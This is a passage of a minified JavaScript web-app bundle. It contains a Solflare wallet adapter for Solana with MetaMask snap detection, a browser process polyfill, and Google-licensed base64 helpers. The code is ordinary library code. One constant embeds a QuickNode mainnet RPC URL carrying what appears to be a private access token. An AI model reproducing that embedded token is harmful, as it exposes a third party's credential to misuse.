uMDI0LTEuNjQ4LTQuMTcxem0xOC4yNTggMTYuMTMtMi40OTUgMy44MjMgNS4zMzkgMS40NjkgMS41MzUtNS4yMDctNC4zNzgtLjA4NXptLTE5LjI0Ny4wODUgMS41MjUgNS4yMDcgNS4zMzktMS40NjktMi40OTUtMy44MjN6Ii8+PHBhdGggZD0ibTEwLjA1NSAxMy4zMTMtMS40ODggMi4yNTEgNS4zMDEuMjM1LS4xODgtNS42OTd6bTEwLjQ4IDAtMy42NzItMy4yNzctLjEyMiA1Ljc2MyA1LjI5Mi0uMjM1LTEuNDk3LTIuMjUxem0tMTAuMTc4IDEwLjI4MyAzLjE4My0xLjU1NC0yLjc0OS0yLjE0Ny0uNDMzIDMuNzAxem02LjY5NS0xLjU1NCAzLjE5MiAxLjU1NC0uNDQzLTMuNzAxeiIvPjwvZz48cGF0aCBkPSJtMjAuMjQ0IDIzLjU5Ni0zLjE5Mi0xLjU1NC4yNTQgMi4wODEtLjAyOC44NzZ6bS05Ljg4NyAwIDIuOTY2IDEuNDAzLS4wMTktLjg3Ni4yMzUtMi4wODEtMy4xODMgMS41NTR6IiBmaWxsPSIjZDdjMWIzIiBzdHJva2U9IiNkN2MxYjMiLz48cGF0aCBkPSJtMTMuMzY5IDE4LjUyMS0yLjY1NS0uNzgxIDEuODc0LS44NTd6bTMuODUxIDAgLjc4MS0xLjYzOCAxLjg4My44NTctMi42NjUuNzgxeiIgZmlsbD0iIzIzMzQ0NyIgc3Ryb2tlPSIjMjMzNDQ3Ii8+PHBhdGggZD0ibTEwLjM1NyAyMy41OTYuNDUyLTMuODIzLTIuOTQ3LjA4NXptOS40MzUtMy44MjMuNDUyIDMuODIzIDIuNDk1LTMuNzM4em0yLjI0MS00LjIwOS01LjI5Mi4yMzUuNDkgMi43MjEuNzgyLTEuNjM4IDEuODgzLjg1N3ptLTExLjMxOCAyLjE3NSAxLjg4My0uODU3Ljc3MiAxLjYzOC40OTktMi43MjEtNS4zMDEtLjIzNXoiIGZpbGw9IiNjZDYxMTYiIHN0cm9rZT0iI2NkNjExNiIvPjxwYXRoIGQ9Im04LjU2NyAxNS41NjQgMi4yMjIgNC4zMzEtLjA3NS0yLjE1NnptMTEuMzI4IDIuMTc1LS4wOTQgMi4xNTYgMi4yMzItNC4zMzEtMi4xMzcgMi4xNzV6bS02LjAyNi0xLjk0LS40OTkgMi43MjEuNjIxIDMuMjExLjE0MS00LjIyOC0uMjY0LTEuNzA0em0yLjg3MiAwLS4yNTQgMS42OTUuMTEzIDQuMjM3LjYzMS0zLjIxMXoiIGZpbGw9IiNlNDc1MWYiIHN0cm9rZT0iI2U0NzUxZiIvPjxwYXRoIGQ9Im0xNy4yMyAxOC41Mi0uNjMxIDMuMjExLjQ1Mi4zMTEgMi43NS0yLjE0Ny4wOTQtMi4xNTZ6bS02LjUxNi0uNzgxLjA3NSAyLjE1NiAyLjc1IDIuMTQ3LjQ1Mi0uMzExLS42MjItMy4yMTF6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48cGF0aCBkPSJtMTcuMjc3IDI0Ljk5OS4wMjgtLjg3Ni0uMjM1LS4yMDdoLTMuNTVsLS4yMTcuMjA3LjAxOS44NzYtMi45NjYtMS40MDMgMS4wMzYuODQ4IDIuMSAxLjQ1OWgzLjYwNmwyLjEwOS0xLjQ1OSAxLjAzNi0uODQ4eiIgZmlsbD0iI2MwYWQ5ZSIgc3Ryb2tlPSIjYzBhZDllIi8+PHBhdGggZD0ibTE3LjA1MSAyMi4wNDItLjQ1Mi0uMzExaC0yLjYwOGwtLjQ1Mi4zMTEtLjIzNSAyLjA4MS4yMTctLjIwN2gzLjU1bC4yMzUuMjA3LS4yNTQtMi4wODF6IiBmaWxsPSIjMTYxNjE2IiBzdHJva2U9IiMxNjE2MTYiLz48cGF0aCBkPSJtMjYuNTA1IDExLjA1My44LTMuODQyLTEuMTk2LTMuNTY5LTkuMDU4IDYuNzIzIDMuNDg0IDIuOTQ3IDQuOTI1IDEuNDQxIDEuMDkyLTEuMjcxLS40NzEtLjMzOS43NTMtLjY4Ny0uNTg0LS40NTIuNzUzLS41NzQtLjQ5OS0uMzc3em0tMjMuMjExLTMuODQxLjggMy44NDItLjUwOC4zNzcuNzUzLjU3NC0uNTc0LjQ1Mi43NTMuNjg3LS40NzEuMzM5IDEuMDgzIDEuMjcxIDQuOTI1LTEuNDQxIDMuNDg0LTIuOTQ3LTkuMDU5LTYuNzIzeiIgZmlsbD0iIzc2M2QxNiIgc3Ryb2tlPSIjNzYzZDE2Ii8+PHBhdGggZD0ibTI1LjQ2IDE0Ljc1NC00LjkyNS0xLjQ0MSAxLjQ5NyAyLjI1MS0yLjIzMiA0LjMzMSAyLjkzOC0uMDM4aDQuMzc4bC0xLjY1Ny01LjEwNHptLTE1LjQwNS0xLjQ0MS00LjkyNSAxLjQ0MS0xLjYzOCA1LjEwNGg0LjM2OWwyLjkyOC4wMzgtMi4yMjItNC4zMzEgMS40ODgtMi4yNTF6bTYuNjg1IDIuNDg2LjMxMS01LjQzMyAxLjQzMS0zLjg3aC02LjM1NmwxLjQxMyAzLjg3LjMyOSA1LjQzMy4xMTMgMS43MTQuMDA5IDQuMjE5aDIuNjFsLjAxOS00LjIxOS4xMjItMS43MTR6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48L2c+PGNpcmNsZSBjeD0iMjMuNSIgY3k9IjIzLjUiIGZpbGw9IiMwMDAiIHI9IjYuNSIvPjxwYXRoIGQ9Im0yNy40NzMgMjUuNTQ1LTEuMzEgMS4zNjhjLS4wMjkuMDMtLjA2My4wNTMtLjEwMS4wN2EuMzEuMzEgMCAwIDEgLS4xMjEuMDI0aC02LjIwOWMtLjAzIDAtLjA1OS0uMDA4LS4wODMtLjAyNGEuMTUuMTUgMCAwIDEgLS4wNTYtLjA2NWMtLjAxMi0uMDI2LS4wMTUtLjA1Ni0uMDEtLjA4NHMuMDE4LS4wNTUuMDM5LS4wNzZsMS4zMTEtMS4zNjhjLjAyOC0uMDMuMDYzLS4wNTMuMTAxLS4wNjlhLjMxLjMxIDAgMCAxIC4xMjEtLjAyNWg2LjIwOGMuMDMgMCAuMDU5LjAwOC4wODMuMDI0YS4xNS4xNSAwIDAgMSAuMDU2LjA2NWMuMDEyLjAyNi4wMTUuMDU2LjAxLjA4NHMtLjAxOC4wNTUtLjAzOS4wNzZ6bS0xLjMxLTIuNzU2Yy0uMDI5LS4wMy0uMDYzLS4wNTMtLjEwMS0uMDdhLjMxLjMxIDAgMCAwIC0uMTIxLS4wMjRoLTYuMjA5Yy0uMDMgMC0uMDU5LjAwOC0uMDgzLjAyNHMtLjA0NC4wMzgtLjA1Ni4wNjUtLjAxNS4wNTYtLjAxLjA4NC4wMTguMDU1LjAzOS4wNzZsMS4zMTEgMS4zNjhjLjAyOC4wMy4wNjMuMDUzLjEwMS4wNjlhLjMxLjMxIDAgMCAwIC4xMjEuMDI1aDYuMjA4Yy4wMyAwIC4wNTktLjAwOC4wODMtLjAyNGEuMTUuMTUgMCAwIDAgLjA1Ni0uMDY1Yy4wMTItLjAyNi4wMTUtLjA1Ni4wMS0uMDg0cy0uMDE4LS4wNTUtLjAzOS0uMDc2em0tNi40MzEtLjk4M2g2LjIwOWEuMzEuMzEgMCAwIDAgLjEyMS0uMDI0Yy4wMzgtLjAxNi4wNzMtLjA0LjEwMS0uMDdsMS4zMS0xLjM2OGMuMDItLjAyMS4wMzQtLjA0Ny4wMzktLjA3NnMuMDAxLS4wNTgtLjAxLS4wODRhLjE1LjE1IDAgMCAwIC0uMDU2LS4wNjVjLS4wMjUtLjAxNi0uMDU0LS4wMjQtLjA4My0uMDI0aC02LjIwOGEuMzEuMzEgMCAwIDAgLS4xMjEuMDI1Yy0uMDM4LjAxNi0uMDcyLjA0LS4xMDEuMDY5bC0xLjMxIDEuMzY4Yy0uMDIuMDIxLS4wMzQuMDQ3LS4wMzkuMDc2cy0uMDAxLjA1OC4wMS4wODQuMDMxLjA0OS4wNTYuMDY1LjA1NC4wMjQuMDgzLjAyNHoiIGZpbGw9InVybCgjYSkiLz48L3N2Zz4=";var ht=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},f5=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},Bf,Zo,iy,sy,oy,Zn,ay,i2,s2,ly,cy,uy,hy,fy;class d5{constructor(){Bf.add(this),Zo.set(this,{}),iy.set(this,"1.0.0"),sy.set(this,"MetaMask"),oy.set(this,h5),Zn.set(this,null),ay.set(this,(e,t)=>{var r;return(r=ht(this,Zo,"f")[e])!=null&&r.push(t)||(ht(this,Zo,"f")[e]=[t]),()=>ht(this,Bf,"m",s2).call(this,e,t)}),ly.set(this,async()=>{if(!ht(this,Zn,"f")){let e;try{e=(await r2(()=>import("./index-0020d024.js"),[],import.meta.url)).default}catch{throw new Error("Unable to load Solflare MetaMask SDK")}f5(this,Zn,new e,"f"),ht(this,Zn,"f").on("standard_change",t=>ht(this,Bf,"m",i2).call(this,"change",t))}return this.accounts.length||await ht(this,Zn,"f").connect(),{accounts:this.accounts}}),cy.set(this,async()=>{ht(this,Zn,"f")&&await ht(this,Zn,"f").disconnect()}),uy.set(this,async(...e)=>{if(!ht(this,Zn,"f"))throw new sn;return await ht(this,Zn,"f").standardSignAndSendTransaction(...e)}),hy.set(this,async(...e)=>{if(!ht(this,Zn,"f"))throw new sn;return await ht(this,Zn,"f").standardSignTransaction(...e)}),fy.set(this,async(...e)=>{if(!ht(this,Zn,"f"))throw new sn;return await ht(this,Zn,"f").standardSignMessage(...e)})}get version(){return ht(this,iy,"f")}get name(){return ht(this,sy,"f")}get icon(){return ht(this,oy,"f")}get chains(){return[G0,bx,xx]}get features(){return{[pv]:{version:"1.0.0",connect:ht(this,ly,"f")},[K0]:{version:"1.0.0",disconnect:ht(this,cy,"f")},[gv]:{version:"1.0.0",on:ht(this,ay,"f")},[Zi]:{version:"1.0.0",supportedTransactionVersions:["legacy",0],signAndSendTransaction:ht(this,uy,"f")},[In]:{version:"1.0.0",supportedTransactionVersions:["legacy",0],signTransaction:ht(this,hy,"f")},[qa]:{version:"1.0.0",signMessage:ht(this,fy,"f")}}}get accounts(){return ht(this,Zn,"f")?ht(this,Zn,"f").standardAccounts:[]}}Zo=new WeakMap,iy=new WeakMap,sy=new WeakMap,oy=new WeakMap,Zn=new WeakMap,ay=new WeakMap,ly=new WeakMap,cy=new WeakMap,uy=new WeakMap,hy=new WeakMap,fy=new WeakMap,Bf=new WeakSet,i2=function(e,...t){var r;(r=ht(this,Zo,"f")[e])==null||r.forEach(i=>i.apply(null,t))},s2=function(e,t){var r;ht(this,Zo,"f")[e]=(r=ht(this,Zo,"f")[e])==null?void 0:r.filter(i=>t!==i)};let iI=!1;function p5(){iI||(k6(new d5),iI=!0)}async function g5(){const n="solflare-detect-metamask";function e(){window.postMessage({target:"metamask-contentscript",data:{name:"metamask-provider",data:{id:n,jsonrpc:"2.0",method:"wallet_getSnaps"}}},window.location.origin)}function t(r){var s,o;const i=r.data;(i==null?void 0:i.target)==="metamask-inpage"&&((s=i.data)==null?void 0:s.name)==="metamask-provider"&&(((o=i.data.data)==null?void 0:o.id)===n?(window.removeEventListener("message",t),i.data.data.error||p5()):e())}window.addEventListener("message",t),window.setTimeout(()=>window.removeEventListener("message",t),5e3),e()}const m5="Solflare";class y5 extends dv{constructor(e={}){super(),this.name=m5,this.url="https://solflare.com",this.icon="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYyNy0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC44ODE5IDguOTgwMiA4Ljg4MTl6IiBmaWxsPSJ1cmwoI2MpIi8+PC9zdmc+",this.supportedTransactionVersions=new Set(["legacy",0]),this._readyState=typeof window>"u"||typeof document>"u"?Ve.Unsupported:Ve.Loadable,this._disconnected=()=>{const t=this._wallet;t&&(t.off("disconnect",this._disconnected),this._wallet=null,this._publicKey=null,this.emit("error",new Op),this.emit("disconnect"))},this._accountChanged=t=>{if(!t)return;const r=this._publicKey;if(r){try{t=new Se(t.toBytes())}catch(i){this.emit("error",new Vl(i==null?void 0:i.message,i));return}r.equals(t)||(this._publicKey=t,this.emit("connect",t))}},this._connecting=!1,this._publicKey=null,this._wallet=null,this._config=e,this._readyState!==Ve.Unsupported&&(Tx(()=>{var t;return(t=window.solflare)!=null&&t.isSolflare||window.SolflareApp?(this._readyState=Ve.Installed,this.emit("readyStateChange",this._readyState),!0):!1}),g5())}get publicKey(){return this._publicKey}get connecting(){return this._connecting}get connected(){var e;return!!((e=this._wallet)!=null&&e.connected)}get readyState(){return this._readyState}async autoConnect(){this.readyState===Ve.Loadable&&q0()||await this.connect()}async connect(){try{if(this.connected||this.connecting)return;if(this._readyState!==Ve.Loadable&&this._readyState!==Ve.Installed)throw new so;if(this.readyState===Ve.Loadable&&q0()){const i=encodeURIComponent(window.location.href),s=encodeURIComponent(window.location.origin);window.location.href=`https://solflare.com/ul/v1/browse/${i}?ref=${s}`;return}let e;try{e=(await r2(()=>import("./index-a3175f07.js"),[],import.meta.url)).default}catch(i){throw new D3(i==null?void 0:i.message,i)}let t;try{t=new e({network:this._config.network})}catch(i){throw new hl(i==null?void 0:i.message,i)}if(this._connecting=!0,!t.connected)try{await t.connect()}catch(i){throw new qs(i==null?void 0:i.message,i)}if(!t.publicKey)throw new qs;let r;try{r=new Se(t.publicKey.toBytes())}catch(i){throw new Vl(i==null?void 0:i.message,i)}t.on("disconnect",this._disconnected),t.on("accountChanged",this._accountChanged),this._wallet=t,this._publicKey=r,this.emit("connect",r)}catch(e){throw this.emit("error",e),e}finally{this._connecting=!1}}async disconnect(){const e=this._wallet;if(e){e.off("disconnect",this._disconnected),e.off("accountChanged",this._accountChanged),this._wallet=null,this._publicKey=null;try{await e.disconnect()}catch(t){this.emit("error",new fv(t==null?void 0:t.message,t))}}this.emit("disconnect")}async sendTransaction(e,t,r={}){try{const i=this._wallet;if(!i)throw new sn;try{const{signers:s,...o}=r;return ts(e)?s!=null&&s.length&&e.sign(s):(e=await this.prepareTransaction(e,t,o),s!=null&&s.length&&e.partialSign(...s)),o.preflightCommitment=o.preflightCommitment||t.commitment,await i.signAndSendTransaction(e,o)}catch(s){throw s instanceof kn?s:new es(s==null?void 0:s.message,s)}}catch(i){throw this.emit("error",i),i}}async signTransaction(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signTransaction(e)||e}catch(r){throw new ai(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signAllTransactions(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signAllTransactions(e)||e}catch(r){throw new ai(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}async signMessage(e){try{const t=this._wallet;if(!t)throw new sn;try{return await t.signMessage(e,"utf8")}catch(r){throw new Bp(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}}}const w5="https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/",o2=({children:n})=>{const e=Y.useMemo(()=>[new l5,new y5],[]);return Q.jsx(N3,{endpoint:w5,children:Q.jsx(J6,{wallets:e,autoConnect:!0,children:Q.jsx(i5,{children:n})})})};var a2={exports:{}},on=a2.exports={},Ei,Ii;function dy(){throw new Error("setTimeout has not been defined")}function py(){throw new Error("clearTimeout has not been defined")}(function(){try{typeof setTimeout=="function"?Ei=setTimeout:Ei=dy}catch{Ei=dy}try{typeof clearTimeout=="function"?Ii=clearTimeout:Ii=py}catch{Ii=py}})();function l2(n){if(Ei===setTimeout)return setTimeout(n,0);if((Ei===dy||!Ei)&&setTimeout)return Ei=setTimeout,setTimeout(n,0);try{return Ei(n,0)}catch{try{return Ei.call(null,n,0)}catch{return Ei.call(this,n,0)}}}function v5(n){if(Ii===clearTimeout)return clearTimeout(n);if((Ii===py||!Ii)&&clearTimeout)return Ii=clearTimeout,clearTimeout(n);try{return Ii(n)}catch{try{return Ii.call(null,n)}catch{return Ii.call(this,n)}}}var ns=[],Sl=!1,Jo,Uf=-1;function _5(){!Sl||!Jo||(Sl=!1,Jo.length?ns=Jo.concat(ns):Uf=-1,ns.length&&c2())}function c2(){if(!Sl){var n=l2(_5);Sl=!0;for(var e=ns.length;e;){for(Jo=ns,ns=[];++Uf<e;)Jo&&Jo[Uf].run();Uf=-1,e=ns.length}Jo=null,Sl=!1,v5(n)}}on.nextTick=function(n){var e=new Array(arguments.length-1);if(arguments.length>1)for(var t=1;t<arguments.length;t++)e[t-1]=arguments[t];ns.push(new u2(n,e)),ns.length===1&&!Sl&&l2(c2)};function u2(n,e){this.fun=n,this.array=e}u2.prototype.run=function(){this.fun.apply(null,this.array)};on.title="browser";on.browser=!0;on.env={};on.argv=[];on.version="";on.versions={};function _s(){}on.on=_s;on.addListener=_s;on.once=_s;on.off=_s;on.removeListener=_s;on.removeAllListeners=_s;on.emit=_s;on.prependListener=_s;on.prependOnceListener=_s;on.listeners=function(n){return[]};on.binding=function(n){throw new Error("process.binding is not supported")};on.cwd=function(){return"/"};on.chdir=function(n){throw new Error("process.chdir is not supported")};on.umask=function(){return 0};var E5=a2.exports;const I5=Eo(E5),S5=()=>{};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const h2=function(n){const e=[];let t=0;for(let r=0;r<n.length;r++){let i=n.charCodeAt(r);i<128?e[t++]=i:i<2048?(e[t++]=i>>6|192,e[t++]=i&63|128):(i&64512)===55296&&r+1<n.length&&(n.charCodeAt(r+1)&64512)===56320?(i=65536+((i&1023)<<10)+(n.charCodeAt(++r)&1023),e[t++]=i>>18|240,e[t++]=i>>12&63|128,e[t++]=i>>6&63|128,e[t++]=i&63|128):(e[t++]=i>>12|224,e[t++]=i>>6&63|128,e[t++]=i&63|128)}return e},T5=function(n){const e=[];let t=0,r=0;for(;t<n.length;){const i=n[t++];if(i<128)e[r++]=String.fromCharCode(i);else if(i>191&&i<224){const s=n[t++];e[r++]=String.fromCharCode((i&31)<<6|s&63)}else if(i>239&&i<365){const s=n[t++],o=n[t++],a=n[t++],l=((i&7)<<18|(s&63)<<12|(o&63)<<6|a&63)-65536;e[r++]=String.fromCharCode(55296+(l>>10)),e[r++]=String.fromCharCode(56320+(l&1023))}else{const s=n[t++],o=n[t++];e[r++]=String.fromCharCode((i&15)<<12|(s&63)<<6|o&63)}}return e.join("")},f2={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(n,e){if(!Array.isArray(n))throw Error("encodeByteArray takes an array as a parameter");this.init_();const t=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let i=0;i<n.length;i+=3){const s=n[i],o=i+1<n.length,a=o?n[i+1]:0,l=i+2<n.length,u=l?n[i+2]:0,h=s>>2,f=(s&3)<<4|a>>4;let p=(a&15)<<2|u>>6,w=u&63;l||(w=64,o||(p=64)),r.push(t[h],t[f],t[p],t[w])}return r.join("")},encodeString(n,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(n):this.encodeByteArray(h2(n),e)},decodeString(n,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(n):T5(this.decodeStringToByteArray(n,e))},decodeStringToByteArray(n,e){this.init_();const t=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let i=0;i<n.length;){const s=t[n.charAt(i++)],a=i<n.length?t[n.charAt(i)]:0;++i;const u=i<n.length?t[n.charAt(i)]:64;++i;const f=i<n.length?t[n.charAt(i)]:64;if(++i,s==null||a==null||u==null||f==null)throw new A5;const p=s<<2|a>>4;if(r.push(p),u!==64){const w=a<<4&240|u>>2;if(r.push(w),f!==64){const x=u<<6&192|f;r.push(x)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let n=0;n<this.ENCODED_VALS.length;n++)this.byteToCharMap_[n]=this.ENCODED_VALS.charAt(n),this.charToByteMap_[this.byteToCharMap_[n]]=n,this.byteToCharMapWebSafe_[n]=this.ENCODED_VALS_WEBSAFE.charAt(n),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[n]]=n,n>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(n)]=n,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(n)]=n)}}};class A5 extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const b5=function(n){const e=h2(n);return f2.encodeByteArray(e,!0)},Dd=function(n){return b5(n).replace(/\./g,"")},d2=function(n){try{return f2.decodeString(n,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function x5(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof globalThis<"u")return globalThis;throw new Error("Unable to locate globalThis object.")}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
